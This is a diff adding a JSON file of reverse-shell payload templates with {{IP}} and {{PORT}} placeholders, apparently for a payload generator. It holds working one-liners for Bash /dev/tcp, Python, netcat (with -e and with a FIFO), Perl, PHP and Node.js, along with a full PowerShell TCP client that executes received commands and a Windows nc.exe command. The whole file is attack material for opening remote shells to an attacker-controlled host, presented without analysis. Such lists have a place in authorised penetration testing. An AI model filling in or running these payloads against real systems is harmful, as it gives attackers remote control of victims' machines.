@@ -1,0 +1,56 @@
+{
+  "reverse_shells": {
+    "linux_unix": [
+      {
+        "language": "Bash",
+        "description": "Standard interactive Bash reverse shell using dev tcp",
+        "payload": "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1"
+      },
+      {
+        "language": "Python",
+        "description": "Python 3 one-liner utilizing the socket and subprocess modules",
+        "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{IP}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
+      },
+      {
+        "language": "Netcat",
+        "description": "Traditional netcat reverse shell executing /bin/sh",
+        "payload": "nc -e /bin/sh {{IP}} {{PORT}}"
+      },
+      {
+        "language": "Netcat (OpenBSD)",
+        "description": "Netcat alternative using a named pipe (FIFO) when -e is unavailable",
+        "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{IP}} {{PORT}} >/tmp/f"
+      },
+      {
+        "language": "Perl",
+        "description": "Perl socket payload mapping standard I/O to a shell",
+        "payload": "perl -e 'use Socket;$i=\"{{IP}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+      }
+    ],
+    "windows": [
+      {
+        "language": "PowerShell",
+        "description": "PowerShell TCP client stream executing received string commands",
+        "payload": "$client = New-Object System.Net.Sockets.TCPClient('{{IP}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+        "powershell": true
+      },
+      {
+        "language": "cmd.exe",
+        "description": "Windows command line using traditional Netcat executable",
+        "payload": "nc.exe {{IP}} {{PORT}} -e cmd.exe"
+      }
+    ],
+    "web_shells": [
+      {
+        "language": "PHP",
+        "description": "PHP web payload executing system commands via sockets",
+        "payload": "php -r '$sock=fsockopen(\"{{IP}}\",{{PORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+      },
+      {
+        "language": "Node.js",
+        "description": "NodeJS spawning a child process mapped to a net socket",
+        "payload": "require('child_process').exec('nc -e /bin/sh {{IP}} {{PORT}}')"
+      }
+    ]
+  }
+}
